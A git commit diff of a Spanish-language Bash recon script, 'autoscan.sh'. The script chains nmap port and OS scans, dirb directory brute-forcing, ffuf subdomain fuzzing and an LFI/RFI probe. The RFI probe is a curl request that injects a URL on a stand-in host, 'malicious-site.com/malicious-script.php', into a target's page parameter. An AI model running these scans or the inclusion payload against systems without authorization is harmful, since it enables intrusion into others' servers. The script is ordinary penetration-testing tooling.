f8fba2df127008c0d8ecab7146eb9a6f4a89fdc9
CM-CA <manuel.couseloalonso@gmail.com>
2024-03-01 17:26:06 +0100

    Update autoscan.sh
    New format

--- autoscan.sh
+++ autoscan.sh
@@ -12,13 +12,12 @@ echo "#     # #  #   #    # #    # ####### "
 echo "#     # #   #  #    # #    #      #  "
 echo "####### #    #  ####  #####       #  "
 
-
 # Funcion para obtener la ip
 
 obtener_direccion_ip() {
     echo "Ingresa la URL o la dirección IP a escanear:"
     read input
-
+    
     # Extraer el dominio de una URL si es necesario
     if [[ $input =~ ^https?:// ]]; then
         # Extrae el dominio de la URL
@@ -26,7 +25,7 @@ obtener_direccion_ip() {
     else
         dominio=$input
     fi
-
+    
     # Verificar si la entrada es una dirección IP válida
     if [[ $dominio =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
         host=$dominio
@@ -46,17 +45,16 @@ obtener_direccion_ip() {
             tipo="URL"
         fi
     fi
-
+    
     echo "La dirección IP obtenida es: $host"
 }
-
-
 
 # Funcion para crear carpeta de trabajo
 
 crear_directorio (){
     echo "Creando directorio de trabajo"
     echo
+    
     if [ -d "$host" ]; then
         echo "El directorio $host ya existe."
     else
@@ -68,78 +66,78 @@ crear_directorio (){
     fi
 }
 
-
 # Funcion scaneo de puertos
 
 escanear_puertos() {
     # ping
     echo "Realizando ping a $host..."
     echo
+    
     if ping -c 1 $host &> /dev/null; then
         echo "El host $host está disponible."
         echo
-    
+        
         # Scaneo con nmap
         echo "Realizando scaneo de puertos con Nmap en el host $host..."
         echo
         sudo nmap -sS -sV -O -p- -T4 --open -vvv -oA ./$host/nmap/resultado $host
-    
+        
     else
         echo "Error: El host $host no es correcto o está caído."
-    fi    
+    fi
 }
 
 escanear_directorios() {
- echo "Realizando búsqueda de directorios de $host"
+    echo "Realizando búsqueda de directorios de $host"
     echo
-
+    
     # Preguntar al usuario si prefiere usar "http://" o "https://"
     echo "¿Deseas usar 'http://' o 'https://' para escanear los directorios? (http/https)"
     read protocolo
-
+    
     # Verificar la respuesta del usuario y ejecutar dirb con el protocolo seleccionado
     case $protocolo in
         "http")
             dirb "http://$host" -N 302 -o ./$host/directorios/directorios.txt
-            ;;
+        ;;
         "https")
             dirb "https://$host" -N 302 -o ./$host/directorios/directorios.txt
-            ;;
+        ;;
         *)
             echo "Opción no válida. Se usará 'http://' por defecto."
             dirb "http://$host" -N 302 -o ./$host/directorios/directorios.txt
-            ;;
+        ;;
     esac
 }
 
 descubrir_subdominios() {
     echo "Descubriendo subdominios de $url"
     echo
-
+    
     # Diccionario para las DNS
     diccionario="/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"
     echo $diccionario
     echo $url
-
+    
     # Preguntar al usuario si prefiere usar "http://" o "https://"
     echo "¿Deseas usar 'http://' o 'https://' para escanear los directorios? (http/https)"
     read protocolo
-
+    
     # Verificar la respuesta del usuario y ejecutar dirb con el protocolo seleccionado
     case $protocolo in
         "http")
-            ffuf -w $diccionario -u http://$url -H "Host:FUZZ.$url" -c -mc 200 > ./$host/subdominios/subdominios.txt        
-            ;;
+            ffuf -w $diccionario -u http://$url -H "Host:FUZZ.$url" -c -mc 200 > ./$host/subdominios/subdominios.txt
+        ;;
         "https")
-            ffuf -w $diccionario -u https://$url -H "Host:FUZZ.$url" -c -mc 200 > ./$host/subdominios/subdominios.txt        
-            ;;
-    esac        
+            ffuf -w $diccionario -u https://$url -H "Host:FUZZ.$url" -c -mc 200 > ./$host/subdominios/subdominios.txt
+        ;;
+    esac
 }
 
 escanear_lfi_rfi_vuln () {
     echo "Introduce la URL para comprobar si es vulnerable a RFI o LFI"
     read input
-
+    
     # Perform checks for LFI and RFI vulnerabilities
     echo "Comprobando vulnerabilidades en $input..."
     
@@ -150,7 +148,7 @@ escanear_lfi_rfi_vuln () {
     else
         echo "No se detecta vulnerabilidad LF en $input"
     fi
-
+    
     # Perform RFI check
     rfi_result=$(curl -s -o /dev/null -w "%{http_code}" "$input?page=http://malicious-site.com/malicious-script.php")
     if [ $rfi_result -eq 200 ]; then
@@ -160,28 +158,6 @@ escanear_lfi_rfi_vuln () {
     fi
 }
 
-# # LLamar a funcion para obtener IP o URL
-# obtener_direccion_ip
-
-# # Llamar a la función correspondiente para escanear dominios o direcciones IP según corresponda
-# case $tipo in
-#     "IP")
-#     # Llama a la funcion crear directorios
-#         crear_directorio
-#         escanear_puertos
-#         escanear_directorios
-#         descubrir_subdominios
-#         ;;
-#     "URL")
-#         crear_directorio
-#         escanear_directorios
-#         descubrir_subdominios
-#         ;;
-#     *)
-#         echo "Tipo de entrada no reconocido."
-#         ;;
-# esac
-
 # Opciones de escaneo
 opciones_escaneo() {
     echo "Selecciona una opción de escaneo:"
@@ -190,53 +166,55 @@ opciones_escaneo() {
     echo "3. Escaneo de directorios y subdominios"
     echo "4. Elegir solo uno de los escaneos"
     echo
-
+    
     read opcion
-
+    
     case $opcion in
         1)
             escanear_puertos
             escanear_directorios
             descubrir_subdominios
-            ;;
+            # Siempre será la ultima opcion
+            escanear_lfi_rfi_vuln
+        ;;
         2)
             escanear_puertos
             escanear_directorios
-            ;;
+        ;;
         3)
             escanear_directorios
             descubrir_subdominios
-            ;;
+        ;;
         4)
             echo "Selecciona solo uno de los escaneos:"
             echo "a. Escaneo de puertos"
             echo "b. Escaneo de directorios"
             echo "c. Descubrir subdominios"
             echo "d. Escaneo posible LFI"
-
+            
             read escaneo
-
+            
             case $escaneo in
                 a)
                     escanear_puertos
-                    ;;
+                ;;
                 b)
                     escanear_directorios
-                    ;;
+                ;;
                 c)
                     descubrir_subdominios
-                    ;;
+                ;;
                 d)
                     escanear_lfi_rfi_vuln
-                    ;;
+                ;;
                 *)
                     echo "Opción no válida."
-                    ;;
+                ;;
             esac
-            ;;
+        ;;
         *)
             echo "Opción no válida."
-            ;;
+        ;;
     esac
 }
 
